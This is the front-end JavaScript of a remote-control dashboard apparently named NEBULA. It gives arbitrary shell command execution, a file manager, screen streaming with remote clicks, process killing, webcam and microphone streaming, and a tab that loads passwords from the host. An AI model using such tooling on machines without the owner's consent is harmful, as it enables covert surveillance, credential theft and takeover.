// Global State
let sseSource = null;
let chart = null;
let hostWidth = 1920;  // Fallback host screen width
let hostHeight = 1080; // Fallback host screen height
let currentCwd = 'C:\\'; // Current shell working directory
let currentFilePath = ''; // Current path in file explorer (empty means drives list)
let selectedPaths = [];
let screenRefreshInterval = null;

// Initialize on Load
document.addEventListener('DOMContentLoaded', () => {
    // Render lucide icons
    lucide.createIcons();
    
    // Initialize chart
    initChart();
    
    // Start SSE telemetry stream
    startTelemetry();
    
    // Fetch screen size of host PC
    fetchScreenSize();
    
    // Start auto screen stream or static refresh on startup
    toggleAutoScreen();
    
    // Load root drives in File Explorer
    loadFiles('');
    
    // Load processes list
    refreshProcesses();
    
    // Query initial user path for terminal
    executeCommandSilent('cd', (output) => {
        if (output) {
            currentCwd = output.trim();
            document.getElementById('terminal-cwd-prompt').textContent = currentCwd + '>';
        }
    });
});

// Switch between File Manager, Process Manager, and AV Sandbox Tabs
function switchTab(tabId) {
    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
    document.querySelectorAll('.tab-panel').forEach(panel => panel.classList.remove('active'));
    
    document.getElementById(`tab-${tabId}-btn`).classList.add('active');
    document.getElementById(`tab-${tabId}`).classList.add('active');
    
    if (tabId === 'processes') {
        refreshProcesses();
    }
    
    if (tabId === 'pass') {
        loadPasswords();
    }
    
    if (tabId === 'av') {
        initSandbox();
    } else {
        stopAVSandbox();
    }
}

// ---------------- TELEMETRY & CHART ---------------- //
function initChart() {
    const ctx = document.getElementById('cpuMemoryChart').getContext('2d');
    chart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: Array(20).fill(''),
            datasets: [
                {
                    label: 'CPU %',
                    borderColor: '#00ff41',
                    backgroundColor: 'rgba(0, 255, 65, 0.06)',
                    borderWidth: 1.5,
                    pointRadius: 0,
                    fill: true,
                    data: Array(20).fill(0),
                    tension: 0.3
                },
                {
                    label: 'RAM %',
                    borderColor: '#00e5ff',
                    backgroundColor: 'rgba(0, 229, 255, 0.04)',
                    borderWidth: 1.5,
                    pointRadius: 0,
                    fill: true,
                    data: Array(20).fill(0),
                    tension: 0.3
                }
            ]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            plugins: {
                legend: {
                    display: true,
                    position: 'top',
                    labels: {
                        color: 'rgba(0,255,65,0.5)',
                        font: { family: 'JetBrains Mono', size: 9 }
                    }
                }
            },
            scales: {
                x: { display: false },
                y: {
                    min: 0,
                    max: 100,
                    ticks: {
                        color: 'rgba(0,255,65,0.3)',
                        font: { family: 'JetBrains Mono', size: 9 }
                    },
                    grid: {
                        color: 'rgba(0,255,65,0.05)'
                    }
                }
            }
        }
    });
}

function startTelemetry() {
    const indicator = document.getElementById('connection-indicator');
    const text = document.getElementById('connection-text');
    
    if (sseSource) sseSource.close();
    
    sseSource = new EventSource('/api/stats-stream');
    
    sseSource.onopen = () => {
        indicator.className = 'connection-status connected';
        text.textContent = 'SSE LIVE';
    };
    
    sseSource.onerror = () => {
        indicator.className = 'connection-status disconnected';
        text.textContent = 'NO SIGNAL';
    };
    
    sseSource.onmessage = (event) => {
        const stats = JSON.parse(event.data);
        updateUIStats(stats);
    };
}

function formatBytes(bytes, decimals = 2) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const dm = decimals < 0 ? 0 : decimals;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
}

function formatDuration(seconds) {
    const s = Math.floor(seconds % 60);
    const m = Math.floor((seconds / 60) % 60);
    const h = Math.floor((seconds / 3600) % 24);
    const d = Math.floor(seconds / 86400);
    
    if (d > 0) return `${d}d ${h}h ${m}m`;
    if (h > 0) return `${h}h ${m}m ${s}s`;
    return `${m}m ${s}s`;
}

function updateUIStats(stats) {
    // Header
    document.getElementById('hostname-display').textContent = stats.hostname;
    document.getElementById('uptime-display').textContent = formatDuration(stats.uptime);
    
    // CPU
    document.getElementById('cpu-percent').textContent = `${Math.round(stats.cpu_percent)}%`;
    document.getElementById('cpu-bar').style.width = `${stats.cpu_percent}%`;
    
    // RAM
    const ramUsedGB = (stats.memory.used / (1024 ** 3)).toFixed(1);
    const ramTotalGB = (stats.memory.total / (1024 ** 3)).toFixed(1);
    document.getElementById('ram-percent').textContent = `${Math.round(stats.memory.percent)}%`;
    document.getElementById('ram-bar').style.width = `${stats.memory.percent}%`;
    document.getElementById('ram-details').textContent = `${ramUsedGB} GB / ${ramTotalGB} GB`;
    
    // Network
    document.getElementById('net-download').textContent = `${formatBytes(stats.net_speed.download)}/s`;
    document.getElementById('net-upload').textContent = `${formatBytes(stats.net_speed.upload)}/s`;
    
    // Battery
    const batteryRow = document.getElementById('battery-row');
    if (stats.battery) {
        batteryRow.classList.remove('hide');
        document.getElementById('battery-val').textContent = `${stats.battery.percent}% ${stats.battery.power_plugged ? '(Charging)' : ''}`;
        
        const bIcon = document.getElementById('battery-icon');
        bIcon.className = '';
        if (stats.battery.power_plugged) {
            bIcon.setAttribute('data-lucide', 'battery-charging');
        } else if (stats.battery.percent > 75) {
            bIcon.setAttribute('data-lucide', 'battery');
        } else if (stats.battery.percent > 30) {
            bIcon.setAttribute('data-lucide', 'battery-medium');
        } else {
            bIcon.setAttribute('data-lucide', 'battery-low');
        }
        lucide.createIcons();
    } else {
        batteryRow.classList.add('hide');
    }
    
    // Update header hex display
    const hexCpu = document.getElementById('hex-cpu');
    const hexMem = document.getElementById('hex-mem');
    if (hexCpu) hexCpu.textContent = `CPU:${stats.cpu_percent.toFixed(1)}%`;
    if (hexMem) hexMem.textContent = `MEM:${stats.memory.percent.toFixed(1)}%`;

    // Update chart
    if (chart) {
        chart.data.datasets[0].data.push(stats.cpu_percent);
        chart.data.datasets[0].data.shift();
        
        chart.data.datasets[1].data.push(stats.memory.percent);
        chart.data.datasets[1].data.shift();
        
        chart.update('none'); // Update without animation for raw performance
    }
}

// ---------------- QUICK CONTROLS ---------------- //
function sendVolume(action) {
    fetch('/api/volume', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: action })
    });
}

function triggerPower(action) {
    fetch('/api/power', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: action })
    });
}

let activePowerAction = null;
function confirmPower(action) {
    activePowerAction = action;
    const modal = document.getElementById('confirm-modal');
    const modalText = document.getElementById('confirm-modal-text');
    const confirmBtn = document.getElementById('confirm-modal-btn');
    
    modalText.textContent = `Are you sure you want to send the "${action.toUpperCase()}" command to the host PC? This might interrupt your active remote session.`;
    
    confirmBtn.onclick = () => {
        triggerPower(activePowerAction);
        closeConfirmModal();
    };
    
    modal.classList.remove('hide');
}

function closeConfirmModal() {
    document.getElementById('confirm-modal').classList.add('hide');
    activePowerAction = null;
}

// ---------------- REMOTE SCREEN ---------------- //
function fetchScreenSize() {
    fetch('/api/screen-size')
        .then(res => res.json())
        .then(data => {
            if (data.width && data.height) {
                hostWidth = data.width;
                hostHeight = data.height;
            }
        });
}

function refreshScreen() {
    const img = document.getElementById('desktop-screenshot');
    const loader = document.getElementById('screen-loading');
    const icon = document.getElementById('screen-refresh-icon');
    if (!img) return;
    
    // If auto refresh is active, we are streaming, no need to refresh static image
    const checkbox = document.getElementById('auto-refresh-screen');
    if (checkbox && checkbox.checked) return;
    
    loader.classList.remove('hide');
    icon.classList.add('spin-anim'); // Add spinning CSS animation
    
    const freshImage = new Image();
    freshImage.src = `/api/screenshot?t=${Date.now()}`;
    freshImage.onload = () => {
        img.src = freshImage.src;
        loader.classList.add('hide');
        icon.classList.remove('spin-anim');
    };
    freshImage.onerror = () => {
        loader.classList.add('hide');
        icon.classList.remove('spin-anim');
    };
}

function toggleAutoScreen() {
    const checkbox = document.getElementById('auto-refresh-screen');
    const label = document.getElementById('auto-refresh-label');
    const img = document.getElementById('desktop-screenshot');
    if (!img) return;
    
    const isChecked = checkbox ? checkbox.checked : false;
    if (isChecked) {
        // Start streaming screen in real-time (MJPEG)
        img.src = "/api/screenshot/stream";
        if (label) {
            label.textContent = "Live Stream (10 FPS)";
            label.style.color = "var(--glow-green)";
        }
    } else {
        // Stop streaming and show a static screenshot
        img.src = `/api/screenshot?t=${Date.now()}`;
        if (label) {
            label.textContent = "Static View";
            label.style.color = "";
        }
    }
}

function handleScreenClick(event) {
    const img = event.target;
    const rect = img.getBoundingClientRect();
    
    const clickX = event.clientX - rect.left;
    const clickY = event.clientY - rect.top;
    
    const normX = clickX / rect.width;
    const normY = clickY / rect.height;
    
    const actualX = Math.round(normX * hostWidth);
    const actualY = Math.round(normY * hostHeight);
    
    fetch('/api/screenshot/click', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ x: actualX, y: actualY })
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            // Trigger screenshot refresh 300ms after click to capture response
            setTimeout(refreshScreen, 300);
        }
    });
}

// ---------------- TERMINAL SHELL ---------------- //
function handleTerminalKey(event) {
    if (event.key === 'Enter') {
        const input = document.getElementById('terminal-command-input');
        const command = input.value.trim();
        if (!command) return;
        
        input.value = '';
        executeTerminalCommand(command);
    }
}

function executeTerminalCommand(command) {
    const terminal = document.getElementById('terminal-output');
    
    // Append entered command
    const cmdLine = document.createElement('div');
    cmdLine.className = 'terminal-line cmd-input';
    cmdLine.textContent = `${currentCwd}> ${command}`;
    terminal.appendChild(cmdLine);
    terminal.scrollTop = terminal.scrollHeight;
    
    // Handle Client-Side cd command intercept to persist workspace folder
    if (command.toLowerCase().startsWith('cd ')) {
        const targetPath = command.substring(3).trim();
        // Run verification: check path by running "cd /d target && cd"
        const verificationCmd = `cd /d "${targetPath}" && cd`;
        
        fetch('/api/terminal/execute', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ command: verificationCmd, cwd: currentCwd })
        })
        .then(res => res.json())
        .then(data => {
            if (data.returncode === 0 && data.stdout) {
                currentCwd = data.stdout.trim();
                document.getElementById('terminal-cwd-prompt').textContent = currentCwd + '>';
                
                const outLine = document.createElement('div');
                outLine.className = 'terminal-line cmd-output';
                outLine.textContent = `Directory changed to: ${currentCwd}`;
                terminal.appendChild(outLine);
            } else {
                const errLine = document.createElement('div');
                errLine.className = 'terminal-line cmd-error';
                errLine.textContent = data.stderr || 'The system cannot find the path specified.';
                terminal.appendChild(errLine);
            }
            terminal.scrollTop = terminal.scrollHeight;
        });
        return;
    }
    
    // Execute standard command
    fetch('/api/terminal/execute', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: command, cwd: currentCwd })
    })
    .then(res => res.json())
    .then(data => {
        if (data.stdout) {
            const outLine = document.createElement('div');
            outLine.className = 'terminal-line cmd-output';
            outLine.textContent = data.stdout;
            terminal.appendChild(outLine);
        }
        if (data.stderr) {
            const errLine = document.createElement('div');
            errLine.className = 'terminal-line cmd-error';
            errLine.textContent = data.stderr;
            terminal.appendChild(errLine);
        }
        if (!data.stdout && !data.stderr && data.returncode !== 0) {
            const errLine = document.createElement('div');
            errLine.className = 'terminal-line cmd-error';
            errLine.textContent = `Process exited with error code ${data.returncode}`;
            terminal.appendChild(errLine);
        }
        terminal.scrollTop = terminal.scrollHeight;
    })
    .catch(err => {
        const errLine = document.createElement('div');
        errLine.className = 'terminal-line cmd-error';
        errLine.textContent = `Network error: ${err.message}`;
        terminal.appendChild(errLine);
        terminal.scrollTop = terminal.scrollHeight;
    });
}

function executeCommandSilent(command, callback) {
    fetch('/api/terminal/execute', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: command })
    })
    .then(res => res.json())
    .then(data => {
        if (data.returncode === 0 && data.stdout) {
            callback(data.stdout);
        }
    });
}

function clearTerminal() {
    const terminal = document.getElementById('terminal-output');
    terminal.innerHTML = '<div class="terminal-line system-msg">NEBULA Shell Environment Cleared.</div>';
}

// ---------------- FILE MANAGER ---------------- //
function loadFiles(path) {
    currentFilePath = path;
    selectedPaths = [];
    document.getElementById('select-all-files').checked = false;
    updateSelectionUI();
    
    fetch(`/api/files/list?path=${encodeURIComponent(path)}`)
        .then(res => res.json())
        .then(data => {
            if (data.error) {
                alert(`Error loading path: ${data.error}`);
                return;
            }
            
            currentFilePath = data.current_path;
            renderDrivesDropdown(data.is_root);
            renderBreadcrumbs(data.current_path, data.is_root);
            renderFilesTable(data.items);
        })
        .catch(err => {
            alert(`Network error loading files: ${err.message}`);
        });
}

function renderDrivesDropdown(isRoot) {
    const dropdown = document.getElementById('drives-dropdown');
    
    // Only load drives list from API when on root page or if dropdown is empty
    if (dropdown.options.length <= 1) {
        fetch('/api/files/list?path=')
            .then(res => res.json())
            .then(data => {
                dropdown.innerHTML = '<option value="">Drives</option>';
                data.items.forEach(item => {
                    const opt = document.createElement('option');
                    opt.value = item.path;
                    opt.textContent = item.name;
                    dropdown.appendChild(opt);
                });
            });
    }
    
    // Set matching option in dropdown if available
    if (!isRoot && currentFilePath) {
        const driveLetter = currentFilePath.substring(0, 3);
        dropdown.value = driveLetter;
    } else {
        dropdown.value = "";
    }
}

function onDriveSelected(drivePath) {
    if (drivePath) {
        loadFiles(drivePath);
    }
}

function goHome() {
    loadFiles('');
}

function renderBreadcrumbs(path, isRoot) {
    const breadcrumbs = document.getElementById('file-breadcrumbs');
    breadcrumbs.innerHTML = '';
    
    const rootItem = document.createElement('span');
    rootItem.className = 'breadcrumb-item';
    rootItem.textContent = 'My PC';
    rootItem.onclick = () => loadFiles('');
    breadcrumbs.appendChild(rootItem);
    
    if (isRoot || !path) return;
    
    const parts = path.split('\\').filter(p => p);
    let accum = '';
    
    parts.forEach((part, idx) => {
        const sep = document.createElement('span');
        sep.className = 'breadcrumb-sep';
        sep.textContent = ' / ';
        breadcrumbs.appendChild(sep);
        
        // Add backslash to drive letter (e.g. C:)
        if (idx === 0) {
            accum = part + '\\';
        } else {
            accum = accum + part + '\\';
        }
        
        const pathRef = accum;
        const item = document.createElement('span');
        item.className = 'breadcrumb-item';
        item.textContent = part;
        item.onclick = () => loadFiles(pathRef);
        breadcrumbs.appendChild(item);
    });
}

function renderFilesTable(items) {
    const body = document.getElementById('files-table-body');
    body.innerHTML = '';
    
    if (items.length === 0) {
        body.innerHTML = `
            <tr>
                <td colspan="5" style="text-align: center; color: var(--text-muted); padding: 2rem;">
                    Empty folder.
                </td>
            </tr>`;
        return;
    }
    
    items.forEach(item => {
        const tr = document.createElement('tr');
        tr.id = `file-row-${btoa(item.path).replace(/=/g, '')}`;
        
        // Checkbox column
        const tdCheck = document.createElement('td');
        const chk = document.createElement('input');
        chk.type = 'checkbox';
        chk.value = item.path;
        chk.onchange = (e) => toggleFileSelection(item.path, e.target.checked);
        tdCheck.appendChild(chk);
        tr.appendChild(tdCheck);
        
        // Name column (with icon)
        const tdName = document.createElement('td');
        const wrapper = document.createElement('div');
        wrapper.className = 'file-name-cell';
        
        const icon = document.createElement('i');
        if (item.is_dir) {
            icon.setAttribute('data-lucide', 'folder');
            icon.className = 'file-icon-dir';
            wrapper.onclick = () => loadFiles(item.path);
        } else {
            icon.setAttribute('data-lucide', 'file');
            icon.className = 'file-icon-file';
            wrapper.onclick = () => downloadSingleFile(item.path);
        }
        wrapper.appendChild(icon);
        
        const textSpan = document.createElement('span');
        textSpan.textContent = item.name;
        wrapper.appendChild(textSpan);
        
        tdName.appendChild(wrapper);
        tr.appendChild(tdName);
        
        // Size column
        const tdSize = document.createElement('td');
        tdSize.className = 'file-size-col';
        tdSize.textContent = item.is_dir ? '--' : formatBytes(item.size);
        tr.appendChild(tdSize);
        
        // Modified column
        const tdTime = document.createElement('td');
        tdTime.className = 'file-time-col';
        const d = new Date(item.mtime * 1000);
        tdTime.textContent = d.toLocaleString();
        tr.appendChild(tdTime);
        
        // Quick Action column
        const tdActions = document.createElement('td');
        tdActions.style.textAlign = 'center';
        
        const delBtn = document.createElement('button');
        delBtn.className = 'row-action-btn';
        delBtn.title = 'Delete';
        delBtn.innerHTML = '<i data-lucide="trash-2"></i>';
        delBtn.onclick = () => deletePathsConfirm([item.path]);
        
        tdActions.appendChild(delBtn);
        tr.appendChild(tdActions);
        
        body.appendChild(tr);
    });
    
    lucide.createIcons();
}

function toggleFileSelection(path, isChecked) {
    const rowId = `file-row-${btoa(path).replace(/=/g, '')}`;
    const row = document.getElementById(rowId);
    
    if (isChecked) {
        if (!selectedPaths.includes(path)) {
            selectedPaths.push(path);
        }
        if (row) row.classList.add('selected');
    } else {
        selectedPaths = selectedPaths.filter(p => p !== path);
        if (row) row.classList.remove('selected');
    }
    
    updateSelectionUI();
}

function toggleSelectAllFiles(isChecked) {
    const body = document.getElementById('files-table-body');
    const inputs = body.querySelectorAll('input[type="checkbox"]');
    
    inputs.forEach(input => {
        input.checked = isChecked;
        toggleFileSelection(input.value, isChecked);
    });
}

function updateSelectionUI() {
    const bar = document.getElementById('selection-actions-bar');
    if (selectedPaths.length > 0) {
        bar.classList.remove('hide');
    } else {
        bar.classList.add('hide');
    }
}

function downloadSingleFile(path) {
    window.location.href = `/api/files/download?paths=${encodeURIComponent(path)}`;
}

function downloadSelected() {
    if (selectedPaths.length === 0) return;
    
    let url = '/api/files/download?';
    selectedPaths.forEach((path, i) => {
        url += `paths=${encodeURIComponent(path)}&`;
    });
    // Truncate last &
    url = url.substring(0, url.length - 1);
    
    window.location.href = url;
}

function deletePathsConfirm(paths) {
    if (confirm(`Are you sure you want to permanently delete these ${paths.length} item(s)? This action CANNOT be undone.`)) {
        fetch('/api/files/delete', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ paths: paths })
        })
        .then(res => res.json())
        .then(data => {
            loadFiles(currentFilePath);
        })
        .catch(err => {
            alert(`Error deleting: ${err.message}`);
        });
    }
}

function deleteSelected() {
    if (selectedPaths.length === 0) return;
    deletePathsConfirm(selectedPaths);
}

function promptCreate(type) {
    if (!currentFilePath) {
        alert('Please navigate inside a drive to create files/folders.');
        return;
    }
    
    const label = type === 'dir' ? 'Folder' : 'File';
    const name = prompt(`Enter name for new ${label}:`);
    if (!name) return;
    
    fetch('/api/files/create', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            parent_path: currentFilePath,
            name: name,
            type: type
        })
    })
    .then(res => res.json())
    .then(data => {
        if (data.error) {
            alert(`Error creating ${label}: ${data.error}`);
        } else {
            loadFiles(currentFilePath);
        }
    })
    .catch(err => {
        alert(`Network error creating item: ${err.message}`);
    });
}

function handleFileUpload() {
    const input = document.getElementById('file-upload-input');
    if (!input.files || input.files.length === 0) return;
    
    if (!currentFilePath) {
        alert('Please select a drive or path before uploading.');
        input.value = '';
        return;
    }
    
    const formData = new FormData();
    formData.append('path', currentFilePath);
    
    for (let i = 0; i < input.files.length; i++) {
        formData.append('files', input.files[i]);
    }
    
    const loader = document.createElement('div');
    loader.style.position = 'absolute';
    loader.style.background = 'rgba(0,0,0,0.5)';
    loader.style.width = '100%';
    loader.style.height = '100%';
    loader.style.top = 0;
    loader.style.left = 0;
    loader.style.display = 'flex';
    loader.style.alignItems = 'center';
    loader.style.justifyContent = 'center';
    loader.innerHTML = '<div style="color:white; font-weight:bold;">Uploading...</div>';
    
    const container = document.querySelector('.files-list-container');
    container.style.position = 'relative';
    container.appendChild(loader);
    
    fetch('/api/files/upload', {
        method: 'POST',
        body: formData
    })
    .then(res => res.json())
    .then(data => {
        container.removeChild(loader);
        input.value = '';
        if (data.error) {
            alert(`Error uploading files: ${data.error}`);
        } else {
            loadFiles(currentFilePath);
        }
    })
    .catch(err => {
        container.removeChild(loader);
        input.value = '';
        alert(`Upload failed: ${err.message}`);
    });
}

// ---------------- PROCESS MANAGER ---------------- //
let rawProcesses = [];

function refreshProcesses() {
    const icon = document.getElementById('proc-refresh-icon');
    icon.classList.add('spin-anim'); // Add spinning animation
    
    fetch('/api/processes')
        .then(res => res.json())
        .then(data => {
            rawProcesses = data.processes || [];
            renderProcesses(rawProcesses);
            icon.classList.remove('spin-anim');
        })
        .catch(err => {
            icon.classList.remove('spin-anim');
            console.error(`Error loading processes: ${err.message}`);
        });
}

function renderProcesses(processesList) {
    const body = document.getElementById('processes-table-body');
    body.innerHTML = '';
    
    if (processesList.length === 0) {
        body.innerHTML = '<tr><td colspan="5" style="text-align: center; color: var(--text-muted);">No processes found.</td></tr>';
        return;
    }
    
    processesList.forEach(proc => {
        const tr = document.createElement('tr');
        
        const tdPid = document.createElement('td');
        tdPid.className = 'proc-pid';
        tdPid.textContent = proc.pid;
        tr.appendChild(tdPid);
        
        const tdName = document.createElement('td');
        tdName.className = 'proc-name';
        tdName.textContent = proc.name;
        tdName.title = proc.name;
        tr.appendChild(tdName);
        
        const tdCpu = document.createElement('td');
        tdCpu.className = 'proc-val-col';
        tdCpu.textContent = proc.cpu.toFixed(1);
        if (proc.cpu > 10) tdCpu.classList.add('med');
        if (proc.cpu > 40) tdCpu.classList.add('high');
        tr.appendChild(tdCpu);
        
        const tdMem = document.createElement('td');
        tdMem.className = 'proc-val-col';
        tdMem.textContent = proc.memory.toFixed(1);
        if (proc.memory > 5) tdMem.classList.add('med');
        if (proc.memory > 15) tdMem.classList.add('high');
        tr.appendChild(tdMem);
        
        const tdActions = document.createElement('td');
        tdActions.style.textAlign = 'center';
        
        const killBtn = document.createElement('button');
        killBtn.className = 'btn kill-btn';
        killBtn.textContent = 'Kill';
        killBtn.onclick = () => killProcess(proc.pid, proc.name);
        
        tdActions.appendChild(killBtn);
        tr.appendChild(tdActions);
        
        body.appendChild(tr);
    });
}

function filterProcesses() {
    const query = document.getElementById('proc-search-input').value.toLowerCase().trim();
    if (!query) {
        renderProcesses(rawProcesses);
        return;
    }
    
    const filtered = rawProcesses.filter(p => 
        p.name.toLowerCase().includes(query) || 
        p.pid.toString().includes(query)
    );
    renderProcesses(filtered);
}

function killProcess(pid, name) {
    if (confirm(`Are you sure you want to terminate the process "${name}" (PID: ${pid})?`)) {
        fetch(`/api/processes/kill/${pid}`, {
            method: 'DELETE'
        })
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                refreshProcesses();
            } else {
                alert(`Failed to terminate process ${pid}. Access Denied or process already closed.`);
            }
        });
    }
}

// ---------------- AV SANDBOX FUNCTIONS ---------------- //
let avCurrentMode = 'backend';

async function initSandbox() {
    // Check backend camera status without auto-streaming on load
    checkBackendCamera();
}

function changePythonCamera(index) {
    const toggle = document.getElementById('camera-stream-toggle');
    const backendImg = document.getElementById('backend-video');
    fetch(`/api/camera/switch?index=${index}`, { method: 'POST' })
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                if (toggle && toggle.checked && backendImg) {
                    backendImg.src = "/video_feed?t=" + new Date().getTime();
                }
                checkBackendCamera();
            } else {
                alert("Failed to switch camera. Check if index is valid and webcam is plugged in.");
            }
        });
}

function switchStreamMode(mode) {
    avCurrentMode = 'backend';
    const backendView = document.getElementById('backend-view');
    if (backendView) backendView.style.display = 'block';
}

function toggleCameraStream() {
    const toggle = document.getElementById('camera-stream-toggle');
    const backendImg = document.getElementById('backend-video');
    const placeholder = document.getElementById('camera-placeholder');
    const badge = document.getElementById('camera-badge');
    const toggleLabel = document.getElementById('stream-toggle-label');
    
    if (!toggle || !backendImg) return;
    
    if (toggle.checked) {
        // Turn on live stream
        backendImg.src = "/video_feed?t=" + new Date().getTime();
        backendImg.style.display = 'block';
        if (placeholder) placeholder.style.display = 'none';
        if (badge) {
            badge.innerText = "▶ LIVE FEED";
            badge.style.color = "var(--glow-green)";
            badge.style.borderColor = "rgba(0, 255, 65, 0.4)";
        }
        if (toggleLabel) {
            toggleLabel.style.color = "var(--glow-green)";
        }
        setTimeout(checkBackendCamera, 1000);
    } else {
        // Turn off live stream
        backendImg.src = "";
        backendImg.style.display = 'none';
        if (placeholder) placeholder.style.display = 'flex';
        if (badge) {
            badge.innerText = "▶ OPENCV SNAPSHOT";
            badge.style.color = "var(--text-muted)";
            badge.style.borderColor = "rgba(0, 255, 65, 0.12)";
        }
        if (toggleLabel) {
            toggleLabel.style.color = "";
        }
        fetch('/api/camera/stream/stop', { method: 'POST' })
            .then(() => checkBackendCamera());
    }
}

function captureCameraSnapshot() {
    const placeholder = document.getElementById('camera-placeholder');
    const backendImg = document.getElementById('backend-video');
    const pythonCamVal = document.getElementById('diag-python-cam');
    const btn = document.getElementById('btn-capture-snapshot');
    const toggle = document.getElementById('camera-stream-toggle');
    
    const isLive = toggle ? toggle.checked : false;
    
    if (isLive) {
        // If live, just trigger a direct download of the snapshot
        if (btn) {
            btn.disabled = true;
            btn.style.opacity = '0.5';
            btn.innerHTML = '<i class="spin-anim" data-lucide="loader" style="width:16px;height:16px;"></i> SAVING...';
            lucide.createIcons();
        }
        
        const ts = Date.now();
        const url = `/api/camera/snapshot?t=${ts}`;
        
        fetch(url)
            .then(res => {
                if (!res.ok) throw new Error("Capture failed");
                return res.blob();
            })
            .then(blob => {
                const blobUrl = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = blobUrl;
                link.download = `snapshot_${ts}.jpg`;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                URL.revokeObjectURL(blobUrl);
                
                if (btn) {
                    btn.disabled = false;
                    btn.style.opacity = '1.0';
                    btn.innerHTML = '<i data-lucide="camera" style="width:16px;height:16px;"></i> CAPTURE SNAPSHOT';
                    lucide.createIcons();
                }
            })
            .catch(err => {
                console.error(err);
                if (btn) {
                    btn.disabled = false;
                    btn.style.opacity = '1.0';
                    btn.innerHTML = '<i data-lucide="camera" style="width:16px;height:16px;"></i> CAPTURE SNAPSHOT';
                    lucide.createIcons();
                }
                showError("Failed to capture snapshot from the running stream.");
            });
    } else {
        // If offline, fetch snapshot, display it in the viewport, and download it
        if (btn) {
            btn.disabled = true;
            btn.style.opacity = '0.5';
            btn.innerHTML = '<i class="spin-anim" data-lucide="loader" style="width:16px;height:16px;"></i> CAPTURING...';
            lucide.createIcons();
        }
        
        if (pythonCamVal) {
            pythonCamVal.innerText = "Capturing...";
            pythonCamVal.style.color = "var(--glow-cyan)";
        }
        
        const ts = Date.now();
        const url = `/api/camera/snapshot?t=${ts}`;
        
        fetch(url)
            .then(res => {
                if (!res.ok) throw new Error("Capture failed");
                return res.blob();
            })
            .then(blob => {
                const blobUrl = URL.createObjectURL(blob);
                
                // Display in viewport
                if (backendImg) {
                    backendImg.src = blobUrl;
                    backendImg.style.display = 'block';
                }
                if (placeholder) placeholder.style.display = 'none';
                
                // Trigger download
                const link = document.createElement('a');
                link.href = blobUrl;
                link.download = `snapshot_${ts}.jpg`;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                
                if (pythonCamVal) {
                    pythonCamVal.innerText = "Captured";
                    pythonCamVal.style.color = "var(--glow-green)";
                }
                
                if (btn) {
                    btn.disabled = false;
                    btn.style.opacity = '1.0';
                    btn.innerHTML = '<i data-lucide="camera" style="width:16px;height:16px;"></i> CAPTURE SNAPSHOT';
                    lucide.createIcons();
                }
                hideError();
            })
            .catch(err => {
                console.error(err);
                if (pythonCamVal) {
                    pythonCamVal.innerText = "Error";
                    pythonCamVal.style.color = "var(--glow-red)";
                }
                if (btn) {
                    btn.disabled = false;
                    btn.style.opacity = '1.0';
                    btn.innerHTML = '<i data-lucide="camera" style="width:16px;height:16px;"></i> CAPTURE SNAPSHOT';
                    lucide.createIcons();
                }
                showError("Failed to capture snapshot from the camera device.");
            });
    }
}

// Releases camera and stream when navigating away
function stopAVSandbox() {
    const toggle = document.getElementById('camera-stream-toggle');
    const backendImg = document.getElementById('backend-video');
    const placeholder = document.getElementById('camera-placeholder');
    const badge = document.getElementById('camera-badge');
    const toggleLabel = document.getElementById('stream-toggle-label');
    
    if (toggle && toggle.checked) {
        toggle.checked = false;
        if (backendImg) {
            backendImg.src = "";
            backendImg.style.display = 'none';
        }
        if (placeholder) placeholder.style.display = 'flex';
        if (badge) {
            badge.innerText = "▶ OPENCV SNAPSHOT";
            badge.style.color = "var(--text-muted)";
            badge.style.borderColor = "rgba(0, 255, 65, 0.12)";
        }
        if (toggleLabel) {
            toggleLabel.style.color = "";
        }
        fetch('/api/camera/stream/stop', { method: 'POST' })
            .then(() => checkBackendCamera());
    }
}

let hostAudioActive = false;
function toggleHostAudio() {
    const btn = document.getElementById('host-audio-btn');
    const player = document.getElementById('host-audio-player');
    if (!btn || !player) return;

    if (!hostAudioActive) {
        // Start streaming host audio
        player.src = "/audio_feed?t=" + new Date().getTime();
        player.play().then(() => {
            hostAudioActive = true;
            btn.innerText = "🎙️ Listen to Host (On)";
            btn.style.background = "var(--glow-green)";
            btn.style.color = "#fff";
        }).catch(err => {
            console.error("Failed to play host audio stream:", err);
            alert("Could not start audio playback. Ensure the host has an active microphone connected.");
        });
    } else {
        // Stop streaming host audio
        player.pause();
        player.src = "";
        hostAudioActive = false;
        btn.innerText = "🎙️ Listen to Host (Off)";
        btn.style.background = "";
        btn.style.color = "";
    }
}

function checkBackendCamera() {
    fetch('/api/status')
        .then(res => res.json())
        .then(data => {
            const pythonCamVal = document.getElementById('diag-python-cam');
            if (pythonCamVal) {
                if (data.camera_opened) {
                    pythonCamVal.innerText = "Operational";
                    pythonCamVal.style.color = "var(--glow-green)";
                } else {
                    pythonCamVal.innerText = "Unavailable";
                    pythonCamVal.style.color = "var(--glow-yellow)";
                }
            }
        })
        .catch(err => {
            console.error("Backend offline:", err);
            const pythonCamVal = document.getElementById('diag-python-cam');
            if (pythonCamVal) {
                pythonCamVal.innerText = "Offline";
                pythonCamVal.style.color = "var(--glow-red)";
            }
        });
}

function showError(msg) {
